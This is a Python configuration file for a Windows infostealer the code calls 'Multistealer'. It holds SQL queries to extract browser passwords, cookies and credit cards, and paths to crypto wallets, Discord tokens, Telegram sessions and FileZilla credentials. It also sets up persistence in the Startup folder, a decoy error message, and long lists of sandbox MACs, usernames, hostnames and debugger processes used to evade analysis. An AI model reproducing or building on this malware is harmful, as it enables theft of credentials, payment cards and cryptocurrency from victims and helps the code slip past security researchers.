from enum import Enum
from os import environ
from getpass import getuser
from re import compile, IGNORECASE, DOTALL


sys_root = environ.get("SystemRoot", r"C:\Windows")
user_profile = environ.get("USERPROFILE")
user = getuser()
user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


class Browsers(Enum):
    CHROME = "Chrome"
    OPERA_GX = "Opera GX"
    OPERA_DEFAULT = "Opera Default"
    EDGE = "Microsoft Edge"
    BRAVE = "Brave"
    VIVALDI = "Vivaldi"
    YANDEX = "Yandex"


class ChromiumConfig:

    BookmarksRegex = compile(r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL)

    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
    BookmarksData = "Title: {0}\nUrl: {1}\n\n"

    WalletLogs = [
        {
            "name": "Metamask",
            "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci", "ejbalbakoplchlghecdalmeeeajnimhm"]
        },
        {
            "name": "Phantom",
            "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]
        },
        {
            "name": "Binance",
            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
        },
        {
            "name": "Coinbase",
            "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]
        },
        {
            "name": "Trust",
            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
        },
        {
            "name": "Exodus",
            "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]
        }
    ]


class MultistealerConfig:

    PoolSize = 5
    ZipName = f"{user}-st"

    BrowsersData = {
        Browsers.CHROME: {
            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
            "process": "chrome.exe"
        },
        Browsers.OPERA_GX: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
            "process": "opera.exe"
        },
        Browsers.OPERA_DEFAULT: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
            "process": "opera.exe"
        },
        Browsers.EDGE: {
            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
            "process": "msedge.exe"
        },
        Browsers.BRAVE: {
            "path": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "process": "brave.exe"
        },
        Browsers.VIVALDI: {
            "path": rf"{user_profile}\AppData\Local\Vivaldi\User Data",
            "process": "vivaldi.exe"
        },
        Browsers.YANDEX: {
            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
            "process": "browser.exe"
        },
    }


class SystemConfig:

    User = user
    IPUrl = "https://ipinfo.io/json"
    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"


class SenderConfig:

    UserAgent = user_agent


class AutostartConfig:

    AutostartName = "System"
    AutostartPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


class DiscordConfig:

    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
    UserAgent = user_agent
    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"


class TelegramConfig:

    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"


class FileZillaConfig:

    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
    DataFiles = ("recentservers.xml", "sitemanager.xml")
    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"


class MessageConfig:

    MessageTitle = "0x17"
    MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."


class WalletsConfig:

    WalletPaths = [
        {
            "name": "Atomic",
            "path": rf"{user_profile}\AppData\Roaming\atomic\Local Storage\leveldb"
        },
        {
            "name": "Exodus",
            "path": rf"{user_profile}\AppData\Roaming\Exodus\exodus.wallet"
        },
        {
            "name": "Electrum",
            "path": rf"{user_profile}\AppData\Roaming\Electrum\wallets"
        },
        {
            "name": "Ethereum",
            "path": rf"{user_profile}\AppData\Roaming\Ethereum\keystore"
        },
        {
            "name": "Armory",
            "path": rf"{user_profile}\AppData\Roaming\Armory"
        },
        {
            "name": "Bytecoin",
            "path": rf"{user_profile}\AppData\Roaming\bytecoin"
        },
        {
            "name": "Guarda",
            "path": rf"{user_profile}\AppData\Roaming\Guarda\Local Storage\leveldb"
        },
        {
            "name": "Coinomi",
            "path": rf"{user_profile}\AppData\Local\Coinomi\Coinomi\wallets"
        },
        {
            "name": "Zcash",
            "path": rf"{user_profile}\AppData\Local\Zcash"
        },
    ]


class ProtectorConfig:

    MacAddresses = (
        "00:03:47:1a:f1:f1", "00:03:47:20:57:7a", "00:03:47:5d:92:c5", "00:03:47:63:8b:de", "00:03:47:8d:a9:5d",
        "00:0c:29:05:d8:6e", "00:0c:29:2c:c1:21", "00:0c:29:52:52:50", "00:0d:3a:d2:4f:1f", "00:15:5d:00:00:1d",
        "00:15:5d:00:00:a4", "00:15:5d:00:00:b3", "00:15:5d:00:00:c3", "00:15:5d:00:00:f3", "00:15:5d:00:01:81",
        "00:15:5d:00:02:26", "00:15:5d:00:05:8d", "00:15:5d:00:05:d5", "00:15:5d:00:06:43", "00:15:5d:00:07:34",
        "00:15:5d:00:1a:b9", "00:15:5d:00:1c:9a", "00:15:5d:00:26:02", "00:15:5d:13:66:ca", "00:15:5d:13:6d:0c",
        "00:15:5d:1e:01:c8", "00:15:5d:23:4c:a3", "00:15:5d:23:4c:ad", "00:15:5d:b6:e0:cc", "00:1b:21:13:15:20",
        "00:1b:21:13:21:26", "00:1b:21:13:26:44", "00:1b:21:13:32:20", "00:1b:21:13:32:51", "00:1b:21:13:33:55",
        "00:23:cd:ff:94:f0", "00:25:90:36:65:0c", "00:25:90:36:65:38", "00:25:90:36:65:3a", "00:25:90:36:65:3b",
        "00:25:90:36:f0:3b", "00:25:90:65:39:e4", "00:50:56:97:6f:1e", "00:50:56:97:a1:f8", "00:50:56:97:bd:d0",
        "00:50:56:97:e7:6a", "00:50:56:97:ec:f2", "00:50:56:97:f6:c8", "00:50:56:a0:06:8d", "00:50:56:a0:2d:30",
        "00:50:56:a0:38:06", "00:50:56:a0:39:18", "00:50:56:a0:45:03", "00:50:56:a0:59:10", "00:50:56:a0:61:aa",
        "00:50:56:a0:6d:86", "00:50:56:a0:74:6c", "00:50:56:a0:84:88", "00:50:56:a0:88:4c", "00:50:56:a0:99:b6",
        "00:50:56:a0:9d:9b", "00:50:56:a0:a9:54", "00:50:56:a0:aa:80", "00:50:56:a0:af:75", "00:50:56:a0:bc:9a",
        "00:50:56:a0:c8:20", "00:50:56:a0:cd:a8", "00:50:56:a0:d0:fa", "00:50:56:a0:d7:38", "00:50:56:a0:dd:00",
        "00:50:56:a0:f7:ff", "00:50:56:a0:fb:0a", "00:50:56:ae:34:c9", "00:50:56:ae:5d:ea", "00:50:56:ae:64:fc",
        "00:50:56:ae:6f:54", "00:50:56:ae:70:80", "00:50:56:ae:b2:b0", "00:50:56:ae:e5:d5", "00:50:56:b3:05:b4",
        "00:50:56:b3:05:e7", "00:50:56:b3:09:25", "00:50:56:b3:09:9e", "00:50:56:b3:10:a9", "00:50:56:b3:14:59",
        "00:50:56:b3:21:29", "00:50:56:b3:38:68", "00:50:56:b3:38:88", "00:50:56:b3:3b:a6", "00:50:56:b3:42:33",
        "00:50:56:b3:4c:bf", "00:50:56:b3:50:de", "00:50:56:b3:55:58", "00:50:56:b3:70:7a", "00:50:56:b3:73:78",
        "00:50:56:b3:79:92", "00:50:56:b3:91:c8", "00:50:56:b3:94:cb", "00:50:56:b3:9e:9e", "00:50:56:b3:a5:6f",
        "00:50:56:b3:a9:36", "00:50:56:b3:c5:4d", "00:50:56:b3:d0:a7", "00:50:56:b3:dd:03", "00:50:56:b3:ea:ee",
        "00:50:56:b3:ee:e1", "00:50:56:b3:f6:57", "00:50:56:b3:fa:23", "00:90:0b:c8:39:23", "00:90:0b:c8:39:2a",
        "00:90:0b:c8:39:3c", "00:90:0b:c8:39:3d", "00:90:0b:c8:39:4d", "00:e0:4c:06:6b:2c", "00:e0:4c:13:f6:ef",
        "00:e0:4c:20:57:30", "00:e0:4c:2f:16:3f", "00:e0:4c:33:b1:a9", "00:e0:4c:39:76:1e", "00:e0:4c:3f:0b:76",
        "00:e0:4c:42:c7:cb", "00:e0:4c:44:76:54", "00:e0:4c:46:04:ea", "00:e0:4c:46:cf:01", "00:e0:4c:48:ed:10",
        "00:e0:4c:4b:4a:40", "00:e0:4c:4b:ef:a1", "00:e0:4c:4e:9f:d4", "00:e0:4c:51:e5:58", "00:e0:4c:56:42:97",
        "00:e0:4c:57:c2:e3", "00:e0:4c:59:08:ad", "00:e0:4c:59:47:48", "00:e0:4c:60:fa:71", "00:e0:4c:6c:0a:56",
        "00:e0:4c:7b:7b:86", "00:e0:4c:7e:11:ce", "00:e0:4c:82:08:94", "00:e0:4c:82:7f:0a", "00:e0:4c:89:42:fe",
        "00:e0:4c:8e:2f:28", "00:e0:4c:94:1f:20", "00:e0:4c:a2:b2:bd", "00:e0:4c:ae:19:37", "00:e0:4c:b0:2f:67",
        "00:e0:4c:b3:5a:2a", "00:e0:4c:b8:7a:58", "00:e0:4c:b9:c4:3f", "00:e0:4c:c0:65:2c", "00:e0:4c:c4:08:2e",
        "00:e0:4c:c7:ca:f1", "00:e0:4c:c8:aa:d7", "00:e0:4c:c9:2a:08", "00:e0:4c:cb:62:08", "00:e0:4c:d1:56:de",
        "00:e0:4c:d6:86:77", "00:e0:4c:da:bf:6e", "00:e0:4c:e3:3e:b2", "00:e0:4c:e7:c7:bf", "00:e0:4c:ee:5f:08",
        "00:e0:4c:f3:81:1c", "00:e0:4c:f4:eb:63", "00:e0:4c:f7:30:a5", "00:e0:4c:fb:45:fc", "02:86:39:58:1f:75",
        "06:75:91:59:3e:02", "06:ab:f8:36:4f:cb", "06:ea:15:e5:16:b4", "08:00:27:20:4c:1a", "08:00:27:26:1b:94",
        "08:00:27:28:67:1a", "08:00:27:28:e3:8a", "08:00:27:34:7a:b1", "08:00:27:3a:28:73", "08:00:27:45:13:10",
        "08:00:27:46:a3:07", "08:00:27:4a:cc:93", "08:00:27:4f:e9:1d", "08:00:27:5e:53:08", "08:00:27:74:bd:28",
        "08:00:27:7b:5b:3b", "08:00:27:82:3d:dd", "08:00:27:88:f9:c3", "08:00:27:8b:3e:7e", "08:00:27:9f:4d:2f",
        "08:00:27:b6:c5:5a", "08:00:27:c0:be:b8", "08:00:27:ec:0e:51", "08:00:27:f4:14:a6", "08:00:27:fa:22:90",
        "08:00:27:ff:d3:c4", "0c:c4:7a:c8:39:21", "0c:c4:7a:c8:39:33", "0c:c4:7a:c8:39:37", "0c:c4:7a:c8:39:42",
        "12:04:6b:47:c4:71", "12:1b:9e:3c:a6:2c", "12:8a:5c:2a:65:d1", "12:94:86:73:8e:5d", "12:a9:f8:37:65:83",
        "12:b6:4b:62:ea:cd", "12:e6:0c:f5:55:bf", "12:f8:87:ab:13:ec", "16:ef:22:04:af:76", "1a:6c:62:60:3b:f4",
        "1c:99:57:1c:ad:e4", "1e:6c:34:93:68:64", "2a:38:06:16:65:d6", "2e:62:e8:47:14:49", "2e:b8:24:4d:f7:de",
        "2e:bc:c1:0c:cb:c3", "32:11:4d:d0:4a:9e", "3a:18:2f:93:16:06", "3a:7a:4b:23:00:f6", "3c:ec:ef:43:fe:56",
        "3c:ec:ef:43:fe:9c", "3c:ec:ef:43:fe:a4", "3c:ec:ef:43:fe:d6", "3c:ec:ef:43:fe:de", "3c:ec:ef:43:ff:5e",
        "3c:ec:ef:44:00:16", "3c:ec:ef:44:00:34", "3c:ec:ef:44:00:36", "3c:ec:ef:44:00:b4", "3c:ec:ef:44:00:b8",
        "3c:ec:ef:44:00:d0", "3c:ec:ef:44:00:d7", "3c:ec:ef:44:00:fe", "3c:ec:ef:44:01:0c", "3c:ec:ef:44:01:24",
        "3c:ec:ef:44:01:30", "3c:ec:ef:44:01:50", "3c:ec:ef:44:01:57", "3c:ec:ef:44:01:a8", "3c:ec:ef:44:01:aa",
        "3c:ec:ef:44:02:04", "3e:1c:a1:40:b7:5f", "3e:53:81:b7:01:13", "3e:62:aa:de:d7:10", "3e:c1:fd:f1:bf:71",
        "42:01:0a:8a:00:22", "42:01:0a:8a:00:33", "42:01:0a:8e:00:22", "42:01:0a:96:00:22", "42:01:0a:96:00:33",
        "42:85:07:f4:83:d0", "4a:3c:5d:ce:ed:b0", "4e:79:c0:d9:af:c3", "4e:81:81:8e:22:4e", "52:54:00:3b:78:24",
        "52:54:00:8b:a6:08", "52:54:00:a0:41:92", "52:54:00:ab:de:59", "52:54:00:b3:e4:71", "52:e7:af:c5:c6:cb",
        "56:49:c0:b8:e6:2b", "56:b0:6f:ca:0a:e7", "56:e8:92:2e:76:0d", "5a:89:61:39:9a:e2", "5a:e2:a6:a4:44:db",
        "5e:86:e4:3d:0d:f6", "60:02:92:3d:f1:69", "60:02:92:66:10:79", "66:0c:31:e8:d0:15", "72:07:f2:e2:d2:7b",
        "72:b5:c0:9b:a9:b2", "7e:05:a3:62:9c:4d", "7e:44:6c:f0:a3:a7", "7e:66:1f:e8:d5:09", "7e:b8:7b:21:b8:3f",
        "8a:e8:f4:ff:f5:b3", "8e:73:7b:82:ce:ac", "90:48:9a:9d:d5:24", "92:4c:a8:23:fc:2e", "94:de:80:de:1a:35",
        "96:0d:7f:f7:e3:19", "96:2b:e9:43:96:76", "9a:d1:44:ac:db:be", "a6:24:aa:ae:e6:12", "ac:1f:6b:d0:47:a0",
        "ac:1f:6b:d0:48:4e", "ac:1f:6b:d0:48:50", "ac:1f:6b:d0:48:d2", "ac:1f:6b:d0:48:f8", "ac:1f:6b:d0:48:fe",
        "ac:1f:6b:d0:49:1c", "ac:1f:6b:d0:49:26", "ac:1f:6b:d0:49:28", "ac:1f:6b:d0:49:76", "ac:1f:6b:d0:49:86",
        "ac:1f:6b:d0:49:b8", "ac:1f:6b:d0:4c:0a", "ac:1f:6b:d0:4c:a2", "ac:1f:6b:d0:4d:06", "ac:1f:6b:d0:4d:8e",
        "ac:1f:6b:d0:4d:98", "ac:1f:6b:d0:4d:c0", "ac:1f:6b:d0:4d:cc", "ac:1f:6b:d0:4d:e4", "b2:9f:a3:9e:16:9e",
        "b4:a9:5a:b1:c6:fd", "b6:c4:c0:09:08:ae", "b6:ed:9d:27:f4:fa", "be:00:e5:c5:0c:e5", "be:2b:f2:c8:87:6e",
        "bf:af:1b:fc:ce:42", "c2:64:e7:fe:36:18", "c2:bd:e9:ad:a7:9c", "c2:ee:af:fd:29:21", "c8:9f:1d:b6:58:e4",
        "ca:4d:4b:ca:18:cc", "d2:1b:62:b0:55:bb", "d4:81:d7:1e:6c:30", "d4:81:d7:24:1d:4b", "d4:81:d7:24:ee:7d",
        "d4:81:d7:2e:f9:97", "d4:81:d7:31:2c:29", "d4:81:d7:42:0a:0b", "d4:81:d7:47:36:85", "d4:81:d7:52:50:92",
        "d4:81:d7:87:05:ab", "d4:81:d7:92:3a:e6", "d4:81:d7:9d:66:9b", "d4:81:d7:a2:c9:73", "d4:81:d7:ac:5b:69",
        "d4:81:d7:b7:0e:11", "d4:81:d7:c4:2c:5d", "d4:81:d7:cd:96:ef", "d4:81:d7:d9:db:12", "d4:81:d7:e4:93:c9",
        "d4:81:d7:ed:25:54", "d4:81:d7:f1:1f:a2", "d4:81:d7:f2:fb:7a", "d4:81:d7:fc:4c:8a", "d4:81:d7:fe:bc:ef",
        "d6:03:e4:ab:77:8e", "d6:68:e1:6e:8f:0e", "d6:73:50:cc:d2:5d", "da:1f:fb:e4:05:27", "e2:3a:5d:90:aa:50",
        "e2:6f:77:dd:8e:96", "e6:85:43:3c:7e:1a", "ea:02:75:3c:90:9f", "ea:f6:f1:a2:33:76", "f2:44:3c:5e:f7:53",
        "f6:a5:41:31:b2:78", "fa:b9:44:c7:1c:13", "fe:97:78:29:be:37", "ff:6d:36:7e:50:43", "3c:ec:ef:c8:39:37",
        "c8:1f:66:c8:39:2a", "c8:1f:66:c8:39:23", "00:50:56:a0:c1:fd", "ac:1f:6b:d0:48:d8", "00:e0:4c:c9:fb:38",
        "00:e0:4c:11:4c:30", "00:e0:4c:d7:1a:3c", "00:e0:4c:13:38:17", "00:e0:4c:8c:e1:df", "00:e0:4c:b6:47:a3",
        "00:e0:4c:51:2f:48", "00:e0:4c:b8:d7:d7", "00:e0:4c:63:06:ec", "00:e0:4c:d5:18:5e", "ac:1f:6b:d0:4d:08",
        "00:e0:4c:c5:a6:21", "00:e0:4c:56:4c:16", "00:e0:4c:9d:6b:e7", "00:e0:4c:98:40:33", "00:e0:4c:b5:91:7c",
        "00:e0:4c:68:c0:02", "00:e0:4c:eb:9d:83", "00:e0:4c:8f:ef:c5", "00:e0:4c:66:d9:58", "00:e0:4c:6e:12:dd",
        "00:e0:4c:ba:21:c5", "00:e0:4c:c7:76:c9", "00:e0:4c:59:bd:b9", "c4:65:16:e8:19:02", "c4:65:16:e8:16:04",
        "ac:1f:6b:d0:4d:d8", "00:e0:4c:94:59:90", "d4:81:d7:92:c3:ca", "00:e0:4c:ce:bb:79", "c4:65:16:e8:02:09",
        "c4:65:16:e8:16:01", "00:e0:4c:f1:10:c1", "00:e0:4c:1b:d8:33", "0c:c4:7a:c8:39:24", "0c:c4:7a:c8:39:44",
        "00:e0:4c:91:77:bd", "00:e0:4c:24:26:5a", "0c:c4:7a:c8:39:4d", "08:00:27:6e:21:5b", "c4:65:16:e8:17:00",
        "00:e0:4c:18:a3:79", "00:e0:4c:2b:67:15", "00:e0:4c:1b:19:79", "00:e0:4c:33:f8:c6", "00:e0:4c:af:fe:ec",
        "c4:65:16:e8:05:02", "fa:ff:d4:91:30:b0", "84:eb:ef:8a:c5:44", "00:15:5d:bf:eb:47", "c4:65:16:e8:02:07",
        "c4:65:16:e8:12:05", "00:e0:4c:20:50:d8", "00:e0:4c:8f:23:46", "08:00:27:d9:d5:e8", "00:15:5d:00:80:f3",
        "00:15:5d:00:00:12", "00:50:56:97:5f:18", "c4:65:16:e8:11:04", "c4:65:16:e8:12:02", "00:15:5d:00:6a:d4"
    )

    Computers = (
        "00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS",
        "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP",
        "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8",
        "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX",
        "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO",
        "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN",
        "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM",
        "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9",
        "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O",
        "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P",
        "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK",
        "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS",
        "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5",
        "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI",
        "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL",
        "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL",
        "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC",
        "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC",
        "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE",
        "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17",
        "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR",
        "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH",
        "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO",
        "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU",
        "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WORK", "XC64ZB", "XGNSVODU", "ZELJAVA", "3CECEFC83806",
        "C81F66C83805", "DESKTOP-USLVD7G", "DESKTOP-AUPFKSY", "DESKTOP-RP4FIBL", "DESKTOP-6UJBD2J", "DESKTOP-LTMCKLA",
        "DESKTOP-FLTWYYU", "DESKTOP-WA2BY3L", "DESKTOP-UBDJJ0A", "DESKTOP-KXP5YFO", "DESKTOP-DAU8GJ2",
        "DESKTOP-FCRB3FM", "DESKTOP-VYRNO7M", "DESKTOP-PKQNDSR", "DESKTOP-SCNDJWE", "DESKTOP-RSNLFZS",
        "DESKTOP-MWFRVKH", "DESKTOP-QLN2VUF", "DESKTOP-62YPFIQ", "DESKTOP-PA0FNV5", "DESKTOP-B9OARKC",
        "DESKTOP-J5XGGXR", "DESKTOP-JHUHOTB", "DESKTOP-64ACUCH", "DESKTOP-SUNDMI5", "DESKTOP-GCN6MIO", "FERREIRA-W10",
        "DESKTOP-MJC6500", "DESKTOP-WS7PPR2", "DESKTOP-XWQ5FUV", "DESKTOP-UHHSY4R", "DESKTOP-ZJRWGX5",
        "DESKTOP-ZYQYSRD", "WINZDS-MILOBM35", "DESKTOP-K8Y2SAM", "DESKTOP-4GCZVJU", "DESKTOP-O6FBMF7",
        "DESKTOP-WDT1SL6", "EIEEIFYE", "CRYPTODEV222222", "EFA0FDEC-8FA7-4", "DESKTOP-O7BI3PT", "DESKTOP-UHQW8PI",
        "WINZDS-PU0URPVI", "ABIGAI", "JUANYARO", "floppy", "CATWRIGHT"
    )

    Users = (
        "05h00Gi0", "3u2v9m8", "43By4", "4tgiizsLimS", "6O4KyHhJXBiR", "7wjlGX7PjlW4", "8Nl0ColNQ5bq", "8VizSM", "Abby",
        "Amy", "AppOnFlySupport", "ASPNET", "azure", "BUiA1hkm", "BvJChRPnsxn", "cM0uEGN4do", "cMkNdS6",
        "DefaultAccount", "dOuyo8RV71", "DVrzi", "e60UW", "ecVtZ5wE", "EGG0p", "Frank", "fred", "G2DbYLDgzz8Y",
        "george", "GjBsjb", "Guest", "h7dk1xPr", "h86LHD", "Harry Johnson", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF",
        "j6SHA37KA", "j7pNjWM", "John", "jude", "Julia", "kEecfMwgj", "kFu0lQwgX5P", "KUv3bT4", "Lisa", "lK3zMR",
        "lmVwjj9b", "Louise", "Lucas", "mike", "Mr.None", "noK4zG7ZhOf", "o6jdigq", "o8yTi52T", "OgJb6GqgK0O", "patex",
        "PateX", "Paul Jones", "pf5vj", "PgfV1X", "PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u",
        "QORxJKNk", "qZo9A", "RDhJ0CNFevzX", "RGzcBUyrznReg", "S7Wjuf", "server", "SqgFOf3G", "Steve", "test", "TVM",
        "txWas1m2t", "umyUJ", "ink", "Uox1tzaMO", "User01", "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD",
        "xPLyvzr8sgC", "ykj0egq7fze", "DdQrgc", "ryjIJKIrOMs", "nZAp7UBVaS1", "zOEsT", "l3cnbB8Ar5b8", "xUnUy",
        "fNBDSlDTXY", "vzY4jmH0Jw02", "gu17B", "UiQcX", "21zLucUnfI85", "OZFUCOD6", "8LnfAai9QdJR", "5sIBK",
        "rB5BnfuR2", "GexwjQdjXG", "IZZuXj", "ymONofg", "dxd8DJ7c", "JAW4Dz0", "GJAm1NxXVm", "UspG1y1C", "equZE3J",
        "BXw7q", "lubi53aN14cU", "5Y3y73", "9yjCPsEYIMH", "GGw8NR", "JcOtj17dZx", "05KvAUQKPQ", "64F2tKIqO5", "7DBgdxu",
        "uHUQIuwoEFU", "gL50ksOp", "Of20XqH4VL", "tHiF2T", "sal.rosenburg", "hbyLdJtcKyN1", "Rt1r7", "katorres",
        "doroth", "umehunt"
    )

    Tasks = (
        "ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "regedit.exe", "cmd.exe",
        "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe",
        "vmwaretray.exe", "vmwareservice.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe",
        "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe",
        "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe",
        "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe",
        "32dbg.exe", "64dbg.exe", "protection_id.exe", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe",
        "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe",
        "ollydbg.exe", "fakenet.exe", "dumpcap.exe"
    )

    Cards = (
        "virtualbox", "vmware"
    )

    RegistryEnums = (
        "vmware", "qemu", "virtio", "vbox", "xen", "VMW", "Virtual"
    )

    Dlls = (
        rf"{sys_root}\System32\vmGuestLib.dll",
        rf"{sys_root}\vboxmrxnp.dll"
    )

    IPUrl = "http://ip-api.com/line/?fields=hosting"
